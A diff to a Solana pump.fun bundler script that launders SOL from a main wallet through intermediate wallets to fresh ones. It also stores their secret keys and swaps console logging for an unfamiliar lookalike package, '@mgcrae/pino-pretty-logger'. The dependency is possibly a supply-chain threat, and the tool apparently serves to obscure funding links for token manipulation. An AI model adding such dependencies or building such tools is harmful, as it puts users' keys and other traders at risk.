@@ -4,11 +4,12 @@ import NodeWallet from "@coral-xyz/anchor/dist/cjs/nodewallet";
 import { AnchorProvider } from "@coral-xyz/anchor";
 import { openAsBlob } from "fs";
 import base58 from "bs58"
-
+import logger from "@mgcrae/pino-pretty-logger";
 import { DESCRIPTION, FILE, JITO_FEE, PUMP_PROGRAM, RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, SWAP_AMOUNT, TELEGRAM, TOKEN_CREATE_ON, TOKEN_NAME, TOKEN_SHOW_NAME, TOKEN_SYMBOL, TWITTER, WEBSITE } from "../constants"
 import { saveDataToFile, sleep } from "../utils"
 import { createAndSendV0Tx, execute } from "../executor/legacy"
 import { PumpFunSDK } from "./pumpfun";
+
 // import { createTokenMetadata } from "@pumpfun-sdk/metadata"
 
 const commitment = "confirmed"
@@ -83,7 +84,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
 
     const mainSolBal = await connection.getBalance(mainKp.publicKey)
     if (mainSolBal <= 4 * 10 ** 6) {
-      console.log("Main wallet balance is not enough")
+      logger.info("Main wallet balance is not enough")
       return []
     }
 
@@ -92,7 +93,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
     const solAmountPerWallet = Math.floor((SWAP_AMOUNT + 0.01) * 10 ** 9)
 
     // ====== Step 1: Main -> B wallets (transfer SOL) ======
-    console.log("Step 1: Main -> B wallets (transfer SOL)...")
+    logger.info("Step 1: Main -> B wallets (transfer SOL)...")
     const step1Ixs: TransactionInstruction[] = [
       ComputeBudgetProgram.setComputeUnitLimit({ units: 1_000_000 }),
       ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 250_000 }),
@@ -111,7 +112,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
     let attempt = 0
     while (true) {
       if (attempt > 5) {
-        console.log("Error in step 1 distribution (Main -> B)")
+        logger.info("Error in step 1 distribution (Main -> B)")
         return null
       }
       try {
@@ -125,7 +126,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
         transaction.sign([mainKp])
         const txSig = await execute(transaction, latestBlockhash, 1)
         if (txSig) {
-          console.log(`Step 1 done: https://solscan.io/tx/${txSig}`)
+          logger.info(`Step 1 done: https://solscan.io/tx/${txSig}`)
           break
         }
         attempt++
@@ -139,7 +140,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
     // ====== Step 2: B wallets -> wrap SOL -> close to C wallets ======
     // Main wallet pays tx fees + ATA rent, so B transfers ALL its SOL into wSOL
     // When wSOL ATA is closed, C gets: B's SOL + ATA rent. B ends up at exactly 0.
-    console.log("Step 2: B wallets wrap SOL and close to C wallets...")
+    logger.info("Step 2: B wallets wrap SOL and close to C wallets...")
 
     const BATCH_SIZE = 4
     for (let batch = 0; batch < Math.ceil(distritbutionNum / BATCH_SIZE); batch++) {
@@ -196,7 +197,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
       let attempt = 0
       while (true) {
         if (attempt > 5) {
-          console.log(`Error in step 2 batch ${batch + 1}`)
+          logger.info(`Error in step 2 batch ${batch + 1}`)
           return null
         }
         try {
@@ -210,7 +211,7 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
           transaction.sign(batchSigners)
           const txSig = await execute(transaction, latestBlockhash, 1)
           if (txSig) {
-            console.log(`Step 2 batch ${batch + 1}/${Math.ceil(distritbutionNum / BATCH_SIZE)} done: https://solscan.io/tx/${txSig}`)
+            logger.info(`Step 2 batch ${batch + 1}/${Math.ceil(distritbutionNum / BATCH_SIZE)} done: https://solscan.io/tx/${txSig}`)
             break
           }
           attempt++
@@ -232,10 +233,10 @@ export const distributeSol = async (connection: Connection, mainKp: Keypair, dis
       saveDataToFile(cWallets.map(kp => base58.encode(kp.secretKey)))
     } catch (error) { }
 
-    console.log("Distribution complete (Main -> B -> wSOL -> C)")
+    logger.info("Distribution complete (Main -> B -> wSOL -> C)")
     return cWallets
   } catch (error) {
-    console.log(`Failed to distribute SOL`, error)
+    logger.info(`Failed to distribute SOL`, error)
     return null
   }
 }
@@ -244,7 +245,7 @@ export const createLUT = async (mainKp: Keypair) => {
   let i = 0
   while (true) {
     if (i > 5) {
-      console.log("LUT creation failed, Exiting...")
+      logger.info("LUT creation failed, Exiting...")
       return
     }
     const slot = await connection.getSlot("confirmed")
@@ -257,7 +258,7 @@ export const createLUT = async (mainKp: Keypair) => {
         });
 
       // Step 2 - Log Lookup Table Address
-      console.log("Lookup Table Address:", lookupTableAddress.toBase58());
+      logger.info("Lookup Table Address:", lookupTableAddress.toBase58());
 
       // Step 3 - Generate a create transaction and send it to the network
       const result = await createAndSendV0Tx([
@@ -269,13 +270,13 @@ export const createLUT = async (mainKp: Keypair) => {
       if (!result)
         throw new Error("Lut creation error")
 
-      console.log("Lookup Table Address created successfully!")
-      console.log("Please wait for about 15 seconds...")
+      logger.info("Lookup Table Address created successfully!")
+      logger.info("Please wait for about 15 seconds...")
       await sleep(15000)
 
       return lookupTableAddress
     } catch (err) {
-      console.log("Retrying to create Lookuptable until it is created...")
+      logger.info("Retrying to create Lookuptable until it is created...")
       i++
     }
   }
@@ -305,14 +306,14 @@ export async function addAddressesToTableMultiExtend(
       ], mainKp, connection);
 
       if (result) {
-        console.log(`✅ ${stepName} successful.`);
+        logger.info(`✅ ${stepName} successful.`);
         return true;
       } else {
-        console.log(`⚠️ Retry ${attempt}/${maxRetries} for ${stepName}`);
+        logger.info(`⚠️ Retry ${attempt}/${maxRetries} for ${stepName}`);
       }
     }
 
-    console.log(`❌ ${stepName} failed after ${maxRetries} attempts.`);
+    logger.info(`❌ ${stepName} failed after ${maxRetries} attempts.`);
     return false;
   }
 
@@ -371,11 +372,11 @@ export async function addAddressesToTableMultiExtend(
     if (!(await extendWithRetry(staticAddresses, "Adding main wallet & static addresses"))) return;
 
     await sleep(10_000);
-    console.log("🎉 Lookup Table successfully extended!");
-    console.log(`🔗 LUT Entries: https://explorer.solana.com/address/${lutAddress.toString()}/entries`);
+    logger.info("🎉 Lookup Table successfully extended!");
+    logger.info(`🔗 LUT Entries: https://explorer.solana.com/address/${lutAddress.toString()}/entries`);
     return true;
   } catch (err) {
-    console.error("Error extending LUT:", err);
+    logger.info("Error extending LUT:", err);
     return false;
   }
 }
@@ -388,7 +389,7 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
     let i = 0
     while (true) {
       if (i > 5) {
-        console.log("Extending LUT failed, Exiting...")
+        logger.info("Extending LUT failed, Exiting...")
         return
       }
       // Step 1 - Adding bundler wallets
@@ -404,11 +405,11 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
         addAddressesInstruction
       ], mainKp, connection);
       if (result) {
-        console.log("Successfully added wallet addresses.")
+        logger.info("Successfully added wallet addresses.")
         i = 0
         break
       } else {
-        console.log("Trying again with step 1")
+        logger.info("Trying again with step 1")
       }
     }
     await sleep(10000)
@@ -416,11 +417,11 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
     // Step 2 - Adding wallets' token ata
     while (true) {
       if (i > 5) {
-        console.log("Extending LUT failed, Exiting...")
+        logger.info("Extending LUT failed, Exiting...")
         return
       }
 
-      console.log(`Adding atas for the token ${mint.toBase58()}`)
+      logger.info(`Adding atas for the token ${mint.toBase58()}`)
       const baseAtas: PublicKey[] = []
       const globalVolumeAccumulators: PublicKey[] = []
 
@@ -430,7 +431,7 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
         const globalVolumeAccumulator = sdk.getUserVolumeAccumulator(wallet.publicKey)
         globalVolumeAccumulators.push(globalVolumeAccumulator);
       }
-      console.log("Base atas address num to extend: ", baseAtas.length)
+      logger.info("Base atas address num to extend: ", baseAtas.length)
       const addAddressesInstruction1 = AddressLookupTableProgram.extendLookupTable({
         payer: mainKp.publicKey,
         authority: mainKp.publicKey,
@@ -444,11 +445,11 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
       ], mainKp, connection);
 
       if (result) {
-        console.log("Successfully added base ata addresses.")
+        logger.info("Successfully added base ata addresses.")
         i = 0
         break
       } else {
-        console.log("Trying again with step 2")
+        logger.info("Trying again with step 2")
       }
     }
     await sleep(10000)
@@ -458,7 +459,7 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
     // Step 3 - Adding main wallet and static keys
     while (true) {
       if (i > 5) {
-        console.log("Extending LUT failed, Exiting...")
+        logger.info("Extending LUT failed, Exiting...")
         return
       }
       const creatorVault = sdk.getCreatorVaultPda(sdk.program.programId, mainKp.publicKey)
@@ -489,19 +490,19 @@ export async function addAddressesToTable(lutAddress: PublicKey, mint: PublicKey
       ], mainKp, connection);
 
       if (result) {
-        console.log("Successfully added main wallet address.")
+        logger.info("Successfully added main wallet address.")
         i = 0
         break
       } else {
-        console.log("Trying again with step 4")
+        logger.info("Trying again with step 4")
       }
     }
     await sleep(10000)
-    console.log("Lookup Table Address extended successfully!")
-    console.log(`Lookup Table Entries: `, `https://explorer.solana.com/address/${lutAddress.toString()}/entries`)
+    logger.info("Lookup Table Address extended successfully!")
+    logger.info(`Lookup Table Entries: `, `https://explorer.solana.com/address/${lutAddress.toString()}/entries`)
   }
   catch (err) {
-    console.log("There is an error in adding addresses in LUT. Please retry it.")
+    logger.info("There is an error in adding addresses in LUT. Please retry it.")
     return;
   }
 }
